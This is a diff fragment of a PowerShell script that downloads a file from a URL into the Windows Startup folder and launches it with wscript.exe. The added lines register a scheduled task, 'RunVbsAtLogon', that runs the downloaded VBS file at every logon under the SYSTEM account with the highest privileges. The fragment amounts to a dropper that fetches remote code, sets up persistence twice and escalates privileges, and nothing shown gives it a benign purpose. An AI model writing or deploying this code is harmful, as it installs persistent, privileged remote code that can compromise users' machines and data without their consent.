@@ -15,3 +15,23 @@ Invoke-WebRequest -Uri $url -OutFile $startupPath
 
 # Optionally run it immediately (in background)
 Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWindow
+
+# Define the full path to the script in the Startup folder
+$startupFolder = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
+$scriptPath = Join-Path $startupFolder "test.vbs"
+
+# Define the action: run wscript.exe with the script path
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptPath`""
+
+# Define the trigger: at user logon
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+
+# Define the principal: SYSTEM account with highest privileges
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+
+# Optional task settings
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
+# Register the scheduled task
+Register-ScheduledTask -TaskName "RunVbsAtLogon" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+
